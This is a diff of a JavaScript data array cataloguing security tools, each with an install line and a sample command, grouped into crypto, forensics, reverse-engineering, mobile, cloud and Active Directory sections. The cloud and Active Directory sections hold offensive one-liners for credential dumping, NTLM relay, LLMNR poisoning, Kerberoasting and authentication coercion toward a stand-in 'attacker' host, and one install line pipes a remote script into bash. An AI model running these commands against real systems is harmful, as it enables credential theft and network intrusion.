+{tool:"Cryptsetup",category:"crypto",platform:"both",difficulty:"advanced",desc:"LUKS",install:"pkg install cryptsetup",command:"cryptsetup luksFormat /dev/sdb"},
+{tool:"Age",category:"crypto",platform:"both",difficulty:"intermediate",desc:"Modern encryption",install:"pkg install age",command:"age -r key.txt file"},
+{tool:"Gocryptfs",category:"crypto",platform:"both",difficulty:"advanced",desc:"Encrypted FS",install:"pkg install gocryptfs",command:"gocryptfs cipher plain"},
+{tool:"RsaCtfTool",category:"crypto",platform:"both",difficulty:"expert",desc:"RSA attacks",install:"git clone https://github.com/RsaCtfTool/RsaCtfTool",command:"python RsaCtfTool.py --publickey key.pub"},
+{tool:"Factordb-Py",category:"crypto",platform:"both",difficulty:"advanced",desc:"Factor DB",install:"pip install factordb-pycli",command:"factordb 12345"},
+{tool:"XorTool",category:"crypto",platform:"both",difficulty:"intermediate",desc:"XOR analysis",install:"pip install xortool",command:"xortool file.bin"},
+{tool:"Ciphey",category:"crypto",platform:"both",difficulty:"intermediate",desc:"Auto decryption",install:"pip install ciphey",command:"ciphey -t 'ciphertext'"},
+{tool:"Dcode",category:"crypto",platform:"both",difficulty:"beginner",desc:"Cipher identifier",install:"# موقع",command:"# dcode.fr"},
+{tool:"Quipqiup",category:"crypto",platform:"both",difficulty:"beginner",desc:"Substitution solver",install:"# موقع",command:"# quipqiup.com"},
+{tool:"Cryptii",category:"crypto",platform:"both",difficulty:"beginner",desc:"Cipher converter",install:"# موقع",command:"# cryptii.com"},
+{tool:"Pkcs12Utils",category:"crypto",platform:"both",difficulty:"advanced",desc:"PKCS12 tools",install:"pkg install openssl",command:"openssl pkcs12 -in file.p12"},
+{tool:"SSLyze",category:"crypto",platform:"both",difficulty:"advanced",desc:"SSL scanner",install:"pip install sslyze",command:"sslyze t.com:443"},
+{tool:"Testssl",category:"crypto",platform:"both",difficulty:"advanced",desc:"TLS scanner",install:"pkg install testssl",command:"testssl.sh t.com"},
+{tool:"Sslscan",category:"crypto",platform:"both",difficulty:"intermediate",desc:"SSL scanner",install:"pkg install sslscan",command:"sslscan t.com"},
+
+// ═══════════════════════════════════════════════════════
+// TOOLS — Forensics (25 أداة)
+// ═══════════════════════════════════════════════════════
+{tool:"Volatility3",category:"forensics",platform:"both",difficulty:"expert",desc:"تحليل RAM",install:"pip install volatility3",command:"vol -f mem.dmp windows.pslist"},
+{tool:"Autopsy",category:"forensics",platform:"kali",difficulty:"advanced",desc:"Forensic UI",install:"apt install autopsy",command:"autopsy"},
+{tool:"Foremost",category:"forensics",platform:"both",difficulty:"intermediate",desc:"استعادة ملفات",install:"pkg install foremost",command:"foremost -i disk.img -o out/"},
+{tool:"Testdisk",category:"forensics",platform:"both",difficulty:"intermediate",desc:"استعادة partitions",install:"pkg install testdisk",command:"testdisk disk.img"},
+{tool:"Photorec",category:"forensics",platform:"both",difficulty:"intermediate",desc:"استعادة صور",install:"pkg install testdisk",command:"photorec disk.img"},
+{tool:"SleuthKit",category:"forensics",platform:"both",difficulty:"advanced",desc:"FS analysis",install:"pkg install sleuthkit",command:"fls -r disk.img"},
+{tool:"Scalpel",category:"forensics",platform:"both",difficulty:"advanced",desc:"استعادة ملفات",install:"pkg install scalpel",command:"scalpel disk.img -o out/"},
+{tool:"BulkExtractor",category:"forensics",platform:"kali",difficulty:"expert",desc:"استخراج بيانات",install:"# من GitHub",command:"bulk_extractor -o out/ disk.img"},
+{tool:"Rekall",category:"forensics",platform:"kali",difficulty:"expert",desc:"Memory forensics",install:"pip install rekall",command:"rekall -f mem.dmp"},
+{tool:"Memdump",category:"forensics",platform:"both",difficulty:"advanced",desc:"Memory dumper",install:"# من GitHub",command:"./memdump"},
+{tool:"LiME",category:"forensics",platform:"kali",difficulty:"expert",desc:"Linux memory",install:"# من GitHub",command:"insmod lime.ko"},
+{tool:"DumpIt-Forensics",category:"forensics",platform:"kali",difficulty:"advanced",desc:"Windows RAM dump",install:"# Windows",command:"DumpIt.exe"},
+{tool:"FTKImager",category:"forensics",platform:"kali",difficulty:"advanced",desc:"Disk imager",install:"# Windows",command:"FTKImager.exe"},
+{tool:"DD",category:"forensics",platform:"both",difficulty:"beginner",desc:"Disk dump",install:"pkg install coreutils",command:"dd if=/dev/sdb of=disk.img"},
+{tool:"DCFLDD",category:"forensics",platform:"both",difficulty:"intermediate",desc:"Forensic dd",install:"pkg install dcfldd",command:"dcfldd if=/dev/sdb of=disk.img"},
+{tool:"Guymager",category:"forensics",platform:"kali",difficulty:"intermediate",desc:"GUI imager",install:"apt install guymager",command:"guymager"},
+{tool:"SANS-SIFT",category:"forensics",platform:"kali",difficulty:"expert",desc:"SIFT workstation",install:"# ISO",command:"# VM"},
+{tool:"Plaso",category:"forensics",platform:"both",difficulty:"expert",desc:"Timeline",install:"pip install plaso",command:"log2timeline.py timeline.plaso disk.img"},
+{tool:"Timesketch",category:"forensics",platform:"kali",difficulty:"expert",desc:"Timeline analysis",install:"# docker",command:"docker-compose up"},
+{tool:"RegRipper",category:"forensics",platform:"both",difficulty:"advanced",desc:"Windows registry",install:"git clone https://github.com/keydet89/RegRipper3.0",command:"rip.pl -r NTUSER.DAT"},
+{tool:"Pecmd",category:"forensics",platform:"kali",difficulty:"intermediate",desc:"Prefetch parser",install:"# من GitHub",command:"PECmd.exe -d C:/Windows/Prefetch"},
+{tool:"MFTECmd",category:"forensics",platform:"kali",difficulty:"advanced",desc:"MFT parser",install:"# من GitHub",command:"MFTECmd.exe -f $MFT"},
+{tool:"Volatility2",category:"forensics",platform:"both",difficulty:"expert",desc:"Volatility 2",install:"pip install volatility",command:"vol.py -f mem.dmp pslist"},
+{tool:"Strings-Forensics",category:"forensics",platform:"both",difficulty:"beginner",desc:"strings",install:"pkg install binutils",command:"strings -n 10 mem.dmp"},
+{tool:"Hexdump",category:"forensics",platform:"both",difficulty:"beginner",desc:"hex viewer",install:"pkg install coreutils",command:"hexdump -C file.bin"}
+
+// ═══════════════════════════════════════════════════════
+// TOOLS — Reverse Engineering (40 أداة)
+// ═══════════════════════════════════════════════════════
+{tool:"Ghidra",category:"reverse",platform:"kali",difficulty:"expert",desc:"هندسة عكسية من NSA",install:"apt install ghidra",command:"ghidraRun"},
+{tool:"IDA-Free",category:"reverse",platform:"kali",difficulty:"expert",desc:"IDA Free",install:"# من hex-rays.com",command:"ida64"},
+{tool:"Radare2",category:"reverse",platform:"both",difficulty:"advanced",desc:"إطار تفكيك CLI",install:"pkg install radare2",command:"r2 -d ./binary"},
+{tool:"Cutter",category:"reverse",platform:"kali",difficulty:"advanced",desc:"GUI لـ Radare2",install:"apt install cutter",command:"cutter"},
+{tool:"GDB",category:"reverse",platform:"both",difficulty:"advanced",desc:"GNU debugger",install:"pkg install gdb",command:"gdb ./binary"},
+{tool:"GEF",category:"reverse",platform:"both",difficulty:"expert",desc:"GDB Enhanced Features",install:"bash -c '$(curl -s https://gef.blah.cat/sh)'",command:"gdb -q ./binary"},
+{tool:"Pwndbg",category:"reverse",platform:"both",difficulty:"expert",desc:"GDB exploit dev",install:"git clone https://github.com/pwndbg/pwndbg",command:"gdb ./binary"},
+{tool:"Pwntools",category:"reverse",platform:"both",difficulty:"expert",desc:"CTF framework",install:"pip install pwntools",command:"python -c 'from pwn import *'"},
+{tool:"Frida",category:"reverse",platform:"both",difficulty:"expert",desc:"حقن ديناميكي",install:"pip install frida-tools",command:"frida -U -f com.app"},
+{tool:"Objection",category:"reverse",platform:"both",difficulty:"advanced",desc:"Frida wrapper",install:"pip install objection",command:"objection -g com.app explore"},
+{tool:"Fridump",category:"reverse",platform:"both",difficulty:"advanced",desc:"Memory dump via Frida",install:"git clone https://github.com/Nightbringer21/fridump",command:"python3 fridump.py -U com.app"},
+{tool:"Checksec",category:"reverse",platform:"both",difficulty:"beginner",desc:"حمايات binary",install:"pkg install checksec",command:"checksec --file=./binary"},
+{tool:"angr",category:"reverse",platform:"both",difficulty:"legendary",desc:"Symbolic execution",install:"pip install angr",command:"python -c 'import angr'"},
+{tool:"Z3",category:"reverse",platform:"both",difficulty:"expert",desc:"SMT solver",install:"pip install z3-solver",command:"python -c 'import z3'"},
+{tool:"Binary Ninja",category:"reverse",platform:"kali",difficulty:"expert",desc:"منصة هندسة عكسية",install:"# من binary.ninja",command:"binaryninja"},
+{tool:"Hopper",category:"reverse",platform:"kali",difficulty:"advanced",desc:"disassembler GUI",install:"# من hopperapp.com",command:"hopper"},
+{tool:"RetDec",category:"reverse",platform:"kali",difficulty:"expert",desc:"decompiler",install:"# من GitHub",command:"retdec-decompiler binary"},
+{tool:"Snowman",category:"reverse",platform:"kali",difficulty:"expert",desc:"decompiler",install:"# من GitHub",command:"snowman binary"},
+{tool:"dnSpy",category:"reverse",platform:"kali",difficulty:"expert",desc:".NET decompiler",install:"# Windows",command:"dnSpy.exe"},
+{tool:"ILSpy",category:"reverse",platform:"kali",difficulty:"advanced",desc:".NET decompiler",install:"# من GitHub",command:"ilspycmd file.dll"},
+{tool:"de4dot",category:"reverse",platform:"kali",difficulty:"expert",desc:".NET deobfuscator",install:"# من GitHub",command:"de4dot.exe file.exe"},
+{tool:"JD-GUI",category:"reverse",platform:"kali",difficulty:"intermediate",desc:"Java decompiler",install:"# من GitHub",command:"jd-gui file.jar"},
+{tool:"CFR",category:"reverse",platform:"both",difficulty:"intermediate",desc:"Java decompiler",install:"# من GitHub",command:"java -jar cfr.jar file.jar"},
+{tool:"Procyon",category:"reverse",platform:"both",difficulty:"advanced",desc:"Java decompiler",install:"# من GitHub",command:"java -jar procyon.jar"},
+{tool:"Jadx-Reverse",category:"reverse",platform:"both",difficulty:"intermediate",desc:"Android decompiler",install:"pkg install jadx",command:"jadx -d out/ app.apk"},
+{tool:"Apktool-Rev",category:"reverse",platform:"both",difficulty:"intermediate",desc:"APK tool",install:"pkg install apktool",command:"apktool d app.apk"},
+{tool:"Fernflower",category:"reverse",platform:"both",difficulty:"advanced",desc:"Java decompiler",install:"# في IntelliJ",command:"# IDE"},
+{tool:"Ghidra-Scripts",category:"reverse",platform:"kali",difficulty:"expert",desc:"مجموعة scripts",install:"# GitHub",command:"# scripts"},
+{tool:"BinaryNinja-Scripts",category:"reverse",platform:"kali",difficulty:"expert",desc:"BN scripts",install:"# GitHub",command:"# scripts"},
+{tool:"Capstone",category:"reverse",platform:"both",difficulty:"expert",desc:"disassembly engine",install:"pip install capstone",command:"python -c 'import capstone'"},
+{tool:"Keystone",category:"reverse",platform:"both",difficulty:"expert",desc:"assembler engine",install:"pip install keystone-engine",command:"python -c 'import keystone'"},
+{tool:"Unicorn",category:"reverse",platform:"both",difficulty:"expert",desc:"CPU emulator",install:"pip install unicorn",command:"python -c 'import unicorn'"},
+{tool:"Qiling",category:"reverse",platform:"both",difficulty:"expert",desc:"Emulation framework",install:"pip install qiling",command:"qltool run --rootfs ./rootfs ./binary"},
+{tool:"Triton",category:"reverse",platform:"kali",difficulty:"legendary",desc:"dynamic symbolic",install:"pip install triton",command:"python -c 'import triton'"},
+{tool:"Miasm",category:"reverse",platform:"both",difficulty:"legendary",desc:"reverse framework",install:"pip install miasm",command:"python -c 'import miasm'"},
+{tool:"Voltron",category:"reverse",platform:"kali",difficulty:"expert",desc:"debugger UI",install:"pip install voltron",command:"voltron"},
+{tool:"Ret-Sync",category:"reverse",platform:"kali",difficulty:"expert",desc:"sync debuggers",install:"# GitHub",command:"# plugin"},
+{tool:"Ghidra-SRE",category:"reverse",platform:"kali",difficulty:"expert",desc:"SRE plugin",install:"# GitHub",command:"# plugin"},
+{tool:"BinDiff",category:"reverse",platform:"kali",difficulty:"expert",desc:"binary diff",install:"# من Google",command:"bindiff"},
+{tool:"Diaphora",category:"reverse",platform:"kali",difficulty:"expert",desc:"diff plugin",install:"# GitHub",command:"# plugin"}
+
+// ═══════════════════════════════════════════════════════
+// TOOLS — Mobile (50 أداة)
+// ═══════════════════════════════════════════════════════
+{tool:"Apktool",category:"mobile",platform:"both",difficulty:"intermediate",desc:"تفكيك وإعادة بناء APK",install:"pkg install apktool",command:"apktool d app.apk -o out/"},
+{tool:"Jadx",category:"mobile",platform:"both",difficulty:"intermediate",desc:"DEX → Java",install:"pkg install jadx",command:"jadx -d out/ app.apk"},
+{tool:"ADB",category:"mobile",platform:"both",difficulty:"beginner",desc:"Android Debug Bridge",install:"pkg install android-tools",command:"adb devices && adb shell"},
+{tool:"Fastboot",category:"mobile",platform:"both",difficulty:"intermediate",desc:"Flash أندرويد",install:"pkg install android-tools",command:"fastboot devices"},
+{tool:"MobSF",category:"mobile",platform:"kali",difficulty:"advanced",desc:"تحليل APK شامل",install:"docker pull opensecurity/mobile-security-framework-mobsf",command:"docker run -p 8000:8000 opensecurity/mobile-security-framework-mobsf"},
+{tool:"APKLeaks",category:"mobile",platform:"both",difficulty:"intermediate",desc:"أسرار في APK",install:"pip install apkleaks",command:"apkleaks -f app.apk"},
+{tool:"dex2jar",category:"mobile",platform:"both",difficulty:"beginner",desc:"DEX → JAR",install:"pkg install dex2jar",command:"d2j-dex2jar app.apk"},
+{tool:"jd-gui",category:"mobile",platform:"kali",difficulty:"intermediate",desc:"Java decompiler GUI",install:"# من GitHub",command:"jd-gui file.jar"},
+{tool:"Frida-Mobile",category:"mobile",platform:"both",difficulty:"expert",desc:"حقن ديناميكي",install:"pip install frida-tools",command:"frida -U -f com.app -l hook.js"},
+{tool:"Objection-Mobile",category:"mobile",platform:"both",difficulty:"advanced",desc:"Frida wrapper",install:"pip install objection",command:"objection -g com.app explore"},
+{tool:"Fridump",category:"mobile",platform:"both",difficulty:"advanced",desc:"Memory dump",install:"git clone https://github.com/Nightbringer21/fridump",command:"python3 fridump.py -U com.app"},
+{tool:"Medusa-Mobile",category:"mobile",platform:"both",difficulty:"advanced",desc:"Frida framework",install:"git clone https://github.com/Ch0pin/medusa",command:"medusa"},
+{tool:"RMS-Runtime",category:"mobile",platform:"both",difficulty:"expert",desc:"Runtime Mobile Security",install:"git clone https://github.com/m0bilesecurity/RMS-Runtime-Mobile-Security",command:"python3 rms.py"},
+{tool:"Drozer",category:"mobile",platform:"both",difficulty:"advanced",desc:"Android security assessment",install:"pip install drozer",command:"drozer console connect"},
+{tool:"Qark",category:"mobile",platform:"both",difficulty:"advanced",desc:"APK static analysis",install:"pip install qark",command:"qark --apk app.apk"},
+{tool:"AndroBugs",category:"mobile",platform:"both",difficulty:"advanced",desc:"Android security",install:"git clone https://github.com/AndroBugs/AndroBugs_Framework",command:"python3 androbugs.py -f app.apk"},
+{tool:"APKTool-M",category:"mobile",platform:"both",difficulty:"intermediate",desc:"APK tool mobile",install:"# من GitHub",command:"apktool"},
+{tool:"uber-apk-signer",category:"mobile",platform:"both",difficulty:"intermediate",desc:"توقيع APK",install:"# من GitHub",command:"java -jar uber-apk-signer.jar -a app.apk"},
+{tool:"apksigner",category:"mobile",platform:"both",difficulty:"intermediate",desc:"توقيع APK",install:"pkg install apksigner",command:"apksigner sign --ks keystore.jks app.apk"},
+{tool:"zipalign",category:"mobile",platform:"both",difficulty:"intermediate",desc:"align APK",install:"pkg install zipalign",command:"zipalign -v 4 in.apk out.apk"},
+{tool:"DEX2SMALI",category:"mobile",platform:"both",difficulty:"advanced",desc:"DEX ↔ smali",install:"# من GitHub",command:"d2j-dex2smali classes.dex"},
+{tool:"Smali-Baksmali",category:"mobile",platform:"both",difficulty:"advanced",desc:"smali tool",install:"# من GitHub",command:"baksmali d classes.dex"},
+{tool:"apk-mitm",category:"mobile",platform:"both",difficulty:"advanced",desc:"MITM APK",install:"npm install -g apk-mitm",command:"apk-mitm app.apk"},
+{tool:"MobSF-API",category:"mobile",platform:"kali",difficulty:"advanced",desc:"MobSF عبر API",install:"docker pull opensecurity/mobile-security-framework-mobsf",command:"curl -X POST http://localhost:8000/api/v1/upload"},
+{tool:"APKiD",category:"mobile",platform:"both",difficulty:"intermediate",desc:"تحديد packers",install:"pip install apkid",command:"apkid app.apk"},
+{tool:"Simplify",category:"mobile",platform:"both",difficulty:"advanced",desc:"deobfuscator",install:"git clone https://github.com/CalebFenton/simplify",command:"java -jar simplify.jar app.apk"},
+{tool:"Baksmali",category:"mobile",platform:"both",difficulty:"advanced",desc:"smali disasm",install:"# من GitHub",command:"baksmali d classes.dex"},
+{tool:"APK-Editor",category:"mobile",platform:"both",difficulty:"beginner",desc:"APK editor",install:"# من GitHub",command:"apkeditor"},
+{tool:"AndroidStudio-Emulator",category:"mobile",platform:"kali",difficulty:"intermediate",desc:"محاكي أندرويد",install:"# android studio",command:"emulator -avd Pixel"},
+{tool:"Genymotion",category:"mobile",platform:"kali",difficulty:"intermediate",desc:"محاكي أندرويد",install:"# من genymotion.com",command:"genymotion"},
+{tool:"Waydroid",category:"mobile",platform:"kali",difficulty:"intermediate",desc:"Android على Linux",install:"# من waydro.id",command:"waydroid session start"},
+{tool:"Scrcpy",category:"mobile",platform:"both",difficulty:"beginner",desc:"Mirror أندرويد",install:"pkg install scrcpy",command:"scrcpy"},
+{tool:"AdbShell",category:"mobile",platform:"both",difficulty:"beginner",desc:"adb shell",install:"pkg install android-tools",command:"adb shell pm list packages"},
+{tool:"Fastboot-Flash",category:"mobile",platform:"both",difficulty:"advanced",desc:"flash recovery",install:"pkg install android-tools",command:"fastboot flash recovery recovery.img"},
+{tool:"Magisk",category:"mobile",platform:"both",difficulty:"advanced",desc:"root بدون system mod",install:"# من GitHub",command:"# flash via recovery"},
+{tool:"SuperSU",category:"mobile",platform:"both",difficulty:"advanced",desc:"root management",install:"# قديم",command:"# recovery"},
+{tool:"Xposed",category:"mobile",platform:"both",difficulty:"advanced",desc:"framework hooks",install:"# via Magisk",command:"# install module"},
+{tool:"EdXposed",category:"mobile",platform:"both",difficulty:"advanced",desc:"Xposed modern",install:"# Magisk",command:"# install"},
+{tool:"LSPosed",category:"mobile",platform:"both",difficulty:"advanced",desc:"Xposed next-gen",install:"# Magisk",command:"# install"},
+{tool:"iOS-IPSW",category:"mobile",platform:"kali",difficulty:"advanced",desc:"iOS firmware",install:"# من ipsw.me",command:"# analysis"},
+{tool:"Frida-iOS-Dump",category:"mobile",platform:"kali",difficulty:"expert",desc:"iOS dump",install:"git clone https://github.com/AloneMonkey/frida-ios-dump",command:"python3 dump.py com.app"},
+{tool:"Class-dump",category:"mobile",platform:"kali",difficulty:"advanced",desc:"iOS headers",install:"# من GitHub",command:"class-dump binary"},
+{tool:"Cycript",category:"mobile",platform:"kali",difficulty:"expert",desc:"iOS runtime",install:"# من site",command:"cycript -p app"},
+{tool:"iNalyzer",category:"mobile",platform:"kali",difficulty:"expert",desc:"iOS analysis",install:"# قديم",command:"# tool"},
+{tool:"Otool",category:"mobile",platform:"kali",difficulty:"advanced",desc:"Mach-O analysis",install:"# Xcode",command:"otool -L binary"},
+{tool:"jtool2",category:"mobile",platform:"kali",difficulty:"expert",desc:"Mach-O toolkit",install:"# من newosxbook.com",command:"jtool2 -l binary"},
+{tool:"Hopper-iOS",category:"mobile",platform:"kali",difficulty:"expert",desc:"iOS decompiler",install:"# hopperapp.com",command:"hopper binary"},
+
+// ═══════════════════════════════════════════════════════
+// TOOLS — Cloud (40 أداة)
+// ═══════════════════════════════════════════════════════
+{tool:"Trivy",category:"cloud",platform:"both",difficulty:"intermediate",desc:"فحص ثغرات صور",install:"pkg install trivy",command:"trivy image nginx:latest"},
+{tool:"kube-hunter",category:"cloud",platform:"both",difficulty:"advanced",desc:"فحص Kubernetes",install:"pip install kube-hunter",command:"kube-hunter --remote target"},
+{tool:"kube-bench",category:"cloud",platform:"both",difficulty:"advanced",desc:"CIS benchmark",install:"# من GitHub",command:"kube-bench run"},
+{tool:"ScoutSuite",category:"cloud",platform:"both",difficulty:"expert",desc:"تقييم AWS/Azure/GCP",install:"pip install scoutsuite",command:"scout aws"},
+{tool:"Prowler",category:"cloud",platform:"both",difficulty:"advanced",desc:"فحص AWS",install:"pip install prowler",command:"prowler aws"},
+{tool:"Checkov",category:"cloud",platform:"both",difficulty:"intermediate",desc:"IaC scanning",install:"pip install checkov",command:"checkov -d ."},
+{tool:"Terrascan",category:"cloud",platform:"both",difficulty:"advanced",desc:"IaC scanner",install:"# من GitHub",command:"terrascan scan"},
+{tool:"Tfsec",category:"cloud",platform:"both",difficulty:"intermediate",desc:"Terraform scanner",install:"# من GitHub",command:"tfsec ."},
+{tool:"Kics",category:"cloud",platform:"both",difficulty:"intermediate",desc:"IaC scanner",install:"# من GitHub",command:"kics scan -p ."},
+{tool:"Kubescape",category:"cloud",platform:"both",difficulty:"advanced",desc:"K8s security",install:"# من GitHub",command:"kubescape scan"},
+{tool:"Kubeaudit",category:"cloud",platform:"both",difficulty:"advanced",desc:"K8s audit",install:"# من GitHub",command:"kubeaudit all"},
+{tool:"Kube-score",category:"cloud",platform:"both",difficulty:"intermediate",desc:"K8s YAML analysis",install:"# من GitHub",command:"kube-score score yaml/*.yaml"},
+{tool:"Popeye",category:"cloud",platform:"both",difficulty:"advanced",desc:"K8s sanitizer",install:"# من GitHub",command:"popeye"},
+{tool:"Kubeconfig-Analyzer",category:"cloud",platform:"both",difficulty:"advanced",desc:"Kubeconfig analysis",install:"# من GitHub",command:"kubeconfig-analyzer"},
+{tool:"Kubeletctl",category:"cloud",platform:"both",difficulty:"expert",desc:"Kubelet exploit",install:"# من GitHub",command:"kubeletctl scan"},
+{tool:"Deepce",category:"cloud",platform:"both",difficulty:"expert",desc:"Docker escape",install:"git clone https://github.com/stealthcopter/deepce",command:"chmod +x deepce.sh && ./deepce.sh"},
+{tool:"Amicontained",category:"cloud",platform:"both",difficulty:"advanced",desc:"Container introspection",install:"# docker",command:"amicontained"},
+{tool:"Grype",category:"cloud",platform:"both",difficulty:"intermediate",desc:"SBOM scanner",install:"# من GitHub",command:"grype image:tag"},
+{tool:"Syft",category:"cloud",platform:"both",difficulty:"intermediate",desc:"SBOM generator",install:"# من GitHub",command:"syft image:tag"},
+{tool:"Docker-Bench",category:"cloud",platform:"kali",difficulty:"advanced",desc:"Docker CIS",install:"# من GitHub",command:"docker run docker/docker-bench-security"},
+{tool:"Dive",category:"cloud",platform:"both",difficulty:"intermediate",desc:"Docker image analysis",install:"# من GitHub",command:"dive nginx:latest"},
+{tool:"Clair",category:"cloud",platform:"kali",difficulty:"advanced",desc:"Container vuln",install:"# docker",command:"clair-scanner"},
+{tool:"Anchore",category:"cloud",platform:"kali",difficulty:"advanced",desc:"Container security",install:"# docker",command:"anchore-cli"},
+{tool:"Pacu",category:"cloud",platform:"both",difficulty:"expert",desc:"AWS exploitation",install:"git clone https://github.com/RhinoSecurityLabs/pacu",command:"python3 pacu.py"},
+{tool:"WeirdAAL",category:"cloud",platform:"both",difficulty:"expert",desc:"AWS attack library",install:"git clone https://github.com/carnal0wnage/weirdAAL",command:"python3 weirdAAL.py"},
+{tool:"CloudFox",category:"cloud",platform:"both",difficulty:"expert",desc:"Cloud enumeration",install:"# من GitHub",command:"cloudfox aws"},
+{tool:"Cloud-Enum",category:"cloud",platform:"both",difficulty:"advanced",desc:"Cloud enumeration",install:"git clone https://github.com/initstring/cloud_enum",command:"python3 cloud_enum.py -k keyword"},
+{tool:"S3Scanner",category:"cloud",platform:"both",difficulty:"intermediate",desc:"S3 bucket scan",install:"pip install s3scanner",command:"s3scanner -bucket mybucket"},
+{tool:"S3-Inspector",category:"cloud",platform:"both",difficulty:"advanced",desc:"S3 permissions",install:"pip install s3-inspector",command:"s3-inspector"},
+{tool:"AWS-CLI",category:"cloud",platform:"both",difficulty:"intermediate",desc:"AWS CLI",install:"pip install awscli",command:"aws s3 ls"},
+{tool:"AWS-Enumerator",category:"cloud",platform:"both",difficulty:"advanced",desc:"AWS enum",install:"pip install aws-enumerator",command:"aws-enumerator"},
+{tool:"Azure-CLI",category:"cloud",platform:"both",difficulty:"intermediate",desc:"Azure CLI",install:"pip install azure-cli",command:"az account list"},
+{tool:"Gcloud-CLI",category:"cloud",platform:"both",difficulty:"intermediate",desc:"GCP CLI",install:"# من Google",command:"gcloud auth list"},
+{tool:"Microsoft-Scanner",category:"cloud",platform:"both",difficulty:"expert",desc:"M365 attack",install:"pip install msspray",command:"msspray"},
+{tool:"Rubeus-Cloud",category:"cloud",platform:"kali",difficulty:"expert",desc:"Azure AD attack",install:"# Windows",command:"Rubeus.exe"},
+{tool:"AADInternals",category:"cloud",platform:"kali",difficulty:"expert",desc:"Azure AD",install:"# PowerShell",command:"Install-Module AADInternals"},
+{tool:"ROADtools",category:"cloud",platform:"both",difficulty:"expert",desc:"Azure AD toolkit",install:"pip install roadrecon",command:"roadrecon auth"},
+{tool:"GraphRunner",category:"cloud",platform:"kali",difficulty:"expert",desc:"M365 Graph",install:"# PowerShell",command:"Import-Module GraphRunner.ps1"},
+{tool:"MFASweep",category:"cloud",platform:"kali",difficulty:"expert",desc:"MFA bypass check",install:"# PowerShell",command:"Invoke-MFASweep"},
+{tool:"TokenTactics",category:"cloud",platform:"kali",difficulty:"expert",desc:"Azure tokens",install:"# PowerShell",command:"Import-Module TokenTactics"},
+{tool:"TeamFiltration",category:"cloud",platform:"both",difficulty:"expert",desc:"M365 enumeration",install:"git clone https://github.com/Flangvik/TeamFiltration",command:"dotnet TeamFiltration.dll"},
+
+// ═══════════════════════════════════════════════════════
+// TOOLS — Active Directory (40 أداة)
+// ═══════════════════════════════════════════════════════
+{tool:"Kerbrute-AD",category:"ad",platform:"both",difficulty:"advanced",desc:"Kerberos enum",install:"go install github.com/ropnop/kerbrute@latest",command:"kerbrute userenum -d d.local users.txt"},
+{tool:"enum4linux-ng",category:"ad",platform:"both",difficulty:"intermediate",desc:"SMB/AD enum",install:"pip install enum4linux-ng",command:"enum4linux-ng -A 10.0.0.1"},
+{tool:"rpcclient",category:"ad",platform:"both",difficulty:"intermediate",desc:"RPC",install:"pkg install samba",command:"rpcclient -U '' -N 10.0.0.1"},
+{tool:"ldapsearch",category:"ad",platform:"both",difficulty:"advanced",desc:"LDAP queries",install:"pkg install openldap",command:"ldapsearch -x -H ldap://DC -b 'dc=d,dc=l'"},
+{tool:"Rubeus-AD",category:"ad",platform:"kali",difficulty:"expert",desc:"Kerberos attacks",install:"# Windows",command:"Rubeus.exe kerberoast"},
+{tool:"SharpHound-AD",category:"ad",platform:"kali",difficulty:"expert",desc:"BloodHound",install:"# Windows",command:"SharpHound.exe -c All"},
+{tool:"BloodHound-AD",category:"ad",platform:"kali",difficulty:"expert",desc:"AD paths",install:"apt install bloodhound",command:"bloodhound"},
+{tool:"BloodHound-CE",category:"ad",platform:"kali",difficulty:"expert",desc:"BloodHound CE",install:"# docker",command:"bloodhound-cli"},
+{tool:"CrackMapExec-AD",category:"ad",platform:"kali",difficulty:"expert",desc:"Swiss army",install:"pip install crackmapexec",command:"cme smb 10.0.0.0/24 -u admin -p pass"},
+{tool:"NetExec",category:"ad",platform:"kali",difficulty:"expert",desc:"CME successor",install:"pip install netexec",command:"nxc smb 10.0.0.0/24 -u admin -p pass"},
+{tool:"Impacket-AD",category:"ad",platform:"both",difficulty:"advanced",desc:"Windows protocols",install:"pip install impacket",command:"impacket-psexec d/u:p@10.0.0.1"},
+{tool:"Psexec.py",category:"ad",platform:"both",difficulty:"advanced",desc:"psexec",install:"pip install impacket",command:"psexec.py d/u:p@10.0.0.1"},
+{tool:"wmiexec.py",category:"ad",platform:"both",difficulty:"advanced",desc:"WMI exec",install:"pip install impacket",command:"wmiexec.py d/u:p@10.0.0.1"},
+{tool:"smbexec.py",category:"ad",platform:"both",difficulty:"advanced",desc:"SMB exec",install:"pip install impacket",command:"smbexec.py d/u:p@10.0.0.1"},
+{tool:"atexec.py",category:"ad",platform:"both",difficulty:"advanced",desc:"Task exec",install:"pip install impacket",command:"atexec.py d/u:p@10.0.0.1 'whoami'"},
+{tool:"secretsdump.py",category:"ad",platform:"both",difficulty:"expert",desc:"Secrets dump",install:"pip install impacket",command:"secretsdump.py d/u:p@DC"},
+{tool:"GetNPUsers.py",category:"ad",platform:"both",difficulty:"advanced",desc:"ASREP roast",install:"pip install impacket",command:"GetNPUsers.py d.local/ -usersfile users.txt"},
+{tool:"GetUserSPNs.py",category:"ad",platform:"both",difficulty:"advanced",desc:"Kerberoast",install:"pip install impacket",command:"GetUserSPNs.py d.local/u:p -request"},
+{tool:"GetADUsers.py",category:"ad",platform:"both",difficulty:"intermediate",desc:"List AD users",install:"pip install impacket",command:"GetADUsers.py -all d.local/u:p"},
+{tool:"mssqlclient.py",category:"ad",platform:"both",difficulty:"advanced",desc:"MSSQL client",install:"pip install impacket",command:"mssqlclient.py d/u:p@10.0.0.1"},
+{tool:"ntlmrelayx.py",category:"ad",platform:"both",difficulty:"expert",desc:"NTLM relay",install:"pip install impacket",command:"ntlmrelayx.py -tf targets.txt -smb2support"},
+{tool:"Responder-AD",category:"ad",platform:"kali",difficulty:"expert",desc:"LLMNR poisoning",install:"apt install responder",note:"Root",command:"responder -I eth0 -rdwv"},
+{tool:"mitm6",category:"ad",platform:"kali",difficulty:"expert",desc:"IPv6 DNS takeover",install:"pip install mitm6",command:"mitm6 -d d.local"},
+{tool:"PetitPotam",category:"ad",platform:"both",difficulty:"expert",desc:"PetitPotam attack",install:"git clone https://github.com/topotam/PetitPotam",command:"python PetitPotam.py attacker DC"},
+{tool:"PrinterBug",category:"ad",platform:"both",difficulty:"expert",desc:"PrinterBug",install:"git clone https://github.com/dirkjanm/krbrelayx",command:"python printerbug.py d/u:p@target attacker"},
+{tool:"DFSCoerce",category:"ad",platform:"kali",difficulty:"expert",desc:"DFSCoerce attack",install:"# من GitHub",command:"python DFSCoerce.py attacker DC"},
+{tool:"ShadowCoerce",category:"ad",platform:"kali",difficulty:"expert",desc:"ShadowCoerce",install:"# من GitHub",command:"python shadowcoerce.py attacker DC"},
